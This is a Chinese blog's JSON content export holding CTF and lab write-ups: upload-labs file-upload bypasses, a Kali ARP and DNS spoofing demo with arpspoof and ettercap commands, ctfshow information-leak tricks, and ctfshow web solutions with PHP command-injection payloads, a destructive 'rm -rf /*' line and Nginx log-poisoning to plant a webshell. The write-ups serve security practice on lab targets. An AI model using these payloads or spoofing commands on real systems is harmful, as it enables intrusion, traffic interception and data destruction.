{"meta":{"title":"阿丶萨德的博客","subtitle":"阿丶萨德","description":"","author":"sjz","url":"http://sunjinzhao998.github.io","root":"/"},"pages":[{"title":"About","date":"2021-04-05T12:00:59.000Z","updated":"2022-01-12T04:08:31.851Z","comments":true,"path":"about/index.html","permalink":"http://sunjinzhao998.github.io/about/index.html","excerpt":"","text":""},{"title":"Categories","date":"2021-04-05T15:22:07.000Z","updated":"2021-04-05T15:23:00.101Z","comments":true,"path":"categories/index.html","permalink":"http://sunjinzhao998.github.io/categories/index.html","excerpt":"","text":""},{"title":"Contact","date":"2021-04-05T15:21:45.000Z","updated":"2021-04-05T15:34:23.729Z","comments":true,"path":"contact/index.html","permalink":"http://sunjinzhao998.github.io/contact/index.html","excerpt":"","text":""},{"title":"Friends","date":"2021-04-05T15:24:31.000Z","updated":"2021-04-05T15:25:17.349Z","comments":true,"path":"friends/index.html","permalink":"http://sunjinzhao998.github.io/friends/index.html","excerpt":"","text":""},{"title":"Tags","date":"2021-04-05T13:28:36.000Z","updated":"2021-04-05T13:29:44.917Z","comments":true,"path":"tags/index.html","permalink":"http://sunjinzhao998.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"Upload-Labs","slug":"upload-labs","date":"2021-12-29T12:16:35.690Z","updated":"2021-04-12T11:47:04.853Z","comments":true,"path":"2021/12/29/upload-labs/","link":"","permalink":"http://sunjinzhao998.github.io/2021/12/29/upload-labs/","excerpt":"","text":"upload-labs关于文件上传这是一个很好的靶机可以练习，了解更多的绕过姿势，如果你想自己搭一个可以去github上下载，和phpstudy配合可以搭出来一个，如果你直接想用现成的可以去FOFA去搜一下，语句为title=”upload-labs” pass-01查看源码发现只允许图片类文件上传 将一句话木马后缀改为jpg，使用burp拦截将包后缀改为php，成功上传 pass-02查看源码发现对文件的content-type类型检测 上传llehs.php更改type类型 上传成功后，访问成功","categories":[],"tags":[{"name":"upload-labs","slug":"upload-labs","permalink":"http://sunjinzhao998.github.io/tags/upload-labs/"}]},{"title":"kali练习之ARP欺骗与DNS欺骗","slug":"kali练习之ARP欺骗与DNS欺骗","date":"2021-12-29T12:16:35.682Z","updated":"2022-01-12T04:19:11.091Z","comments":true,"path":"2021/12/29/kali练习之ARP欺骗与DNS欺骗/","link":"","permalink":"http://sunjinzhao998.github.io/2021/12/29/kali%E7%BB%83%E4%B9%A0%E4%B9%8BARP%E6%AC%BA%E9%AA%97%E4%B8%8EDNS%E6%AC%BA%E9%AA%97/","excerpt":"","text":"ARP欺骗首先介绍一下什么是arp，arp是地址解析协议，根据ip地址能找到相应的mac地址。例如有A主机，B主机，C主机，网关G。在同一局域网内，如果A想联系B,会在arp缓存表里寻找B主机ip对应的mac地址，如果没有找到相应的映射。A会发送arp请求广播在网络上所有的主机，arp请求包含了A主机的ip和mac地址以及B主机的ip。网络中所有的主机会检测ip是否和自己的ip对应，如果不对应则会丢弃，对应的话B主机就会把A的ip以及mac地址保存在arp表中，并且B主机将包含自己的mac地址的arp返回给A主机，A主机将B的ip，mac保存在自己的arp表中。 arp欺骗就是假设A与B通过网关通信，C想知道AB之间的通信内容，所以C假扮网关G向A发送假的arp应答包，此时A的arp缓存表中网关G的mac地址就换成了C的mac地址，C在假扮A主机向网关G发送假的arp应答包，网关G的arp缓存表里A的mac地址就变成了C的mac地址，以后A以后和B通信都要经过C主机，C就知道AB之间通信的内容，这是arp双向欺骗。 那arp单向欺骗就是C只向A发送了包含错误的网关mac地址的arp应答包，G当中A的源mac没有变，当A向外发送数据时找不到网关，就无法与外界通信，也就是上不了网。 DNS欺骗DNS是域名解析服务器，当你请求www.baidu.com时，DNS会把www.baidu.com解析成百度的ip，你就可以通过域名访问百度了 假设A想访问百度，C从中捣乱冒充域名解析服务器，在A访问百度时，将百度的域名解析成自己C自己的ip，此时A访问百度后只能看见C搭建的网站 综合实践演示通过kali可以实现对目标机器的ARP欺骗与DNS欺骗 kali虚拟机ip：192.168.239.132 mac地址：00:0c:29:b9:58:40 win10虚拟机ip：192.168.239.139 mac地址：00-0C-29-56-02-33 win10的arp缓存表 通过arpspoof进行arp欺骗 mac地址被替换为kali的mac地址 此时win10断网 配置kali开启ip转发功能，该文件内容默认为0，此时修改为1 win10又能连接网络了 此时在win10ping 百度的时候，kali开启wireshark能够捕获到相应数据包 dritnet -i eth0可以进行图片嗅探，但是只能捕获到http的图片且十几张只能捕获中的一两张，https的图片无法捕获 DNS欺骗之前先修改ettercap的DNS文件 vim &#x2F;etc&#x2F;ettercap&#x2F;etter.dns 自定义自己的网站 vim &#x2F;var&#x2F;www&#x2F;html&#x2F;index.html 开启apache服务 service apache2 start 利用ettercap进行dns欺骗 ettercap -i eth0 -Tq -M arp:remote -P dns_spoof &#x2F;192.168.239.139&#x2F;&#x2F; &#x2F;192.168.239.2&#x2F;&#x2F; 图形化工具的使用 这个按钮可以探测到局域网内存活的主机 这个按钮可以查看探测到存活主机的信息 将网关添加到add to Target1 目标ip添加到 add to Target2 之后点击ARP poisoning 开启ARP欺骗 之后点击pulgins的manage the plugins,再点击dns_spoof 再点击左上角的start sniffing开始 https可能暂时无法解析","categories":[],"tags":[{"name":"DNS","slug":"DNS","permalink":"http://sunjinzhao998.github.io/tags/DNS/"},{"name":"ARP","slug":"ARP","permalink":"http://sunjinzhao998.github.io/tags/ARP/"}]},{"title":"Ctfshow Vip限免","slug":"ctfshow vip题目限免（持续更新）","date":"2021-12-29T12:16:35.658Z","updated":"2021-04-25T10:48:26.533Z","comments":true,"path":"2021/12/29/ctfshow vip题目限免（持续更新）/","link":"","permalink":"http://sunjinzhao998.github.io/2021/12/29/ctfshow%20vip%E9%A2%98%E7%9B%AE%E9%99%90%E5%85%8D%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/","excerpt":"","text":"ctfshow vip题目限免1.源码泄露F12查看源码得到flag 2.前台JS绕过无法F12或者右击查看与代码，但是可以在url前加上‘view-source:’查看，除此之外在火狐配置（地址栏里about:config）里可以禁用JS，然后再查看源代码 3.协议头信息泄露提示抓包，打开burpsuite，抓到包后，发送到Repeater，发包得到响应头，得到flag 4.robots后台泄露地址栏后输入robots.txt,发现有flagishere.txt，在地址栏访问后得到flag 5.phps源码泄露访问index.phps下载得到源码 6.源码压缩包泄露访问www.zip得到flag 7.版本控制泄露源码访问/.git/得到flag 8.版本控制泄露源码2访问/.svn/ 9.vim临时文件泄露vim改写文件是如果非正常关闭会生成一个.swp的临时文件 访问index.php.swp下载文件得到flag 10.cookie泄露抓个包，cookie里有flag 11.域名txt记录泄露找一个在线域名解析的网站解析一下ctfshow.com（http://www.jsons.cn/nslookup/） 12.敏感信息公布访问/admin/后，账户名是admin，密码是网站最下面的一串数字 13.内部技术文档泄露在网站底部找到INFORMATION下的document里面有后台的网址以及账号密码登录得到flag 14.编辑器配置不当题目提示editor网址输入后进入一个页面，在进入tmp/html/nothinghere里找到一个fl000g.txt,然后在访问/nothinghere/fl000g.txt得到flag 15密码逻辑脆弱打开网站访问/admin/，进入后台返现要输入密码，点击忘记密码，要输入官方所在地，记得网站首页有一个qq号查询是在西安，输入后，告诉你重置后的密码，用户名为admin登录得到flag。 16.探针泄露不得不说，这个3D周期表有亿点炫酷，输入tz.php进入探针页面，再进入phpinfo，找到标题Environment的表格，里面有flag 17.CDN穿透直接ping www.ctfshow.com 找到ip，好像ctfshow的服务器是禁止ping的 18.js敏感信息泄露打开网页的js文件，到最后有一串unicode编码，解码得到提示网址得到flag 19.前端密钥泄露F12看到账户密码填进去发现不是很对，他写了一个js对输入的密码进行加密，得到的密码并不是你输入的，所以进行抓包把密码改一下就行。 20.数据库恶意下载地址栏输入db/db.mdb得到一个下载文件，打开得到flag","categories":[],"tags":[{"name":"ctfshow","slug":"ctfshow","permalink":"http://sunjinzhao998.github.io/tags/ctfshow/"}]},{"title":"Ctfshow","slug":"ctfshow 萌新计划（持续更新）","date":"2021-12-29T12:16:35.658Z","updated":"2021-04-11T09:55:02.798Z","comments":true,"path":"2021/12/29/ctfshow 萌新计划（持续更新）/","link":"","permalink":"http://sunjinzhao998.github.io/2021/12/29/ctfshow%20%E8%90%8C%E6%96%B0%E8%AE%A1%E5%88%92%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/","excerpt":"","text":"ctfshow 萌新计划（持续更新）web1-7首先审计代码，是get方法传一个id的参数，并且需要id的值等于1000，但根据给出的函数id=1000，会输出‘id error’，这是就需要考虑绕过，可构造以下url,可以分别尝试，其中将1000转为二进制可AK1-7题 ?id&#x3D;20*50 ?id&#x3D;1 or id&#x3D;1000 ?id&#x3D;0b1111101000 ?id&#x3D;0x3e8 web8梗题，阿呆删库跑路了 ?flag&#x3D;rm -rf &#x2F;* web9代码显示匹配函数中的system，exec，highlight可获取flag(注意一定要加分号) ?c&#x3D;system(&#39;cat config.php&#39;); ?c&#x3D;highlight_file(&#39;config.php&#39;); web10这次代码中过滤了system，exec，highlight函数,可采用第一种读取config.php的方法，也可采用第二种构造函数的方法。 ?c&#x3D;show_source(&#39;config.php&#39;); ?c&#x3D;$a&#x3D;&#39;sys&#39;;$b&#x3D;&#39;tem&#39;;$c&#x3D;$a.$b;$c(&#39;cat config.php&#39;); ?c&#x3D;passthru(&#39;cat config.php&#39;); web11这次过滤了cat可以继续使用web10中第一种payload。读取文件不只有cat，还有more。或者采取第二种payload ?c&#x3D;$a&#x3D;&#39;sys&#39;;$b&#x3D;&#39;tem&#39;;$c&#x3D;$a.$b;$c(&#39;more config.php&#39;); ?c&#x3D;passthru(&quot;ca&#39;&#39;t config.php&quot;); web12代码中过滤了cat，. , php,config都过滤了，所以将要传参得内容base64编码，再在地址栏里进行解码 ?c&#x3D;$a&#x3D;base64_decode(&quot;c3lzdGVt&quot;);$b&#x3D;base64_decode(&quot;Y2F0IGNvbmZpZy5waHA&#x3D;&quot;);$a($b); web13这次代码把“；”也过滤了，又触及到了我知识盲点，百度亿下大佬的wp，得到下面的payload passthru(\"ca''t `ls`\")?> 小结：php中作为系统中执行外部命令的有如下（奈何我php辣鸡加上题量太少，好多外部执行用不明白） system() passthru() exec() shell_exec() popen() proc_open() pcntl_exec() 另外因为把分号过滤了，所以用?&gt;闭合函数，ls两边是反引号，在tab键上面，第一次知道还有这个。linux中反引号作用是将反引号里的内容先执行，然后把结果cat出来，右击查看源码 web14这次代码又多过滤了括号，构造如下payload ?c&#x3D;echo &#96;$_POST[a]&#96;?&gt; 再给a传参a=cat config.php 简单来说就是输出post的值，a为读取config.php,所以就输出读取之后的值 web15这次又多过滤了&lt;&gt;?,但是没过滤分号，皆大欢喜，构造如下 ?c&#x3D;echo &#96;$_POST[a]&#96;; 给a传参a=cat config.php web16if(md5(\"ctfshow$c\")===\"a6f57ae38a22448c2f07f3f95f49c84e\") 这串代码就是说(ctfshow+$c)的MD5值等于a6f57ae38a22448c2f07f3f95f49c84e MD5值固定长度为32位，c的长度为3。写一个简单的暴力破解MD5 import hashlib a='abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ' for i in a: for j in a: for k in a: s=hashlib.md5(('ctfshow'+i+j+k).encode()).hexdigest() if s=='a6f57ae38a22448c2f07f3f95f49c84e': print(i,j,k) 结果为36d，给c传36d，得到flag web17考察文件包含，在地址栏输入?c=/etc/passwd 后能访问到文件信息，说明有文件包含漏洞 （linux下etx/passwd文件详解可参考https://blog.csdn.net/a1154490629/article/details/52190801） 尝试过data写入一句话没成功，参考网上大佬wp得知可用日志注入 先抓到返回包知道用的中间件是Nginx， 默认日志位置/var/log/nginx/access.log 成功访问 抓包加上一句话木马蚁剑连接得到flag web18-21都可以用web17解出来","categories":[],"tags":[{"name":"ctfshow","slug":"ctfshow","permalink":"http://sunjinzhao998.github.io/tags/ctfshow/"},{"name":"萌新","slug":"萌新","permalink":"http://sunjinzhao998.github.io/tags/%E8%90%8C%E6%96%B0/"}]}],"categories":[],"tags":[{"name":"upload-labs","slug":"upload-labs","permalink":"http://sunjinzhao998.github.io/tags/upload-labs/"},{"name":"DNS","slug":"DNS","permalink":"http://sunjinzhao998.github.io/tags/DNS/"},{"name":"ARP","slug":"ARP","permalink":"http://sunjinzhao998.github.io/tags/ARP/"},{"name":"ctfshow","slug":"ctfshow","permalink":"http://sunjinzhao998.github.io/tags/ctfshow/"},{"name":"萌新","slug":"萌新","permalink":"http://sunjinzhao998.github.io/tags/%E8%90%8C%E6%96%B0/"}]}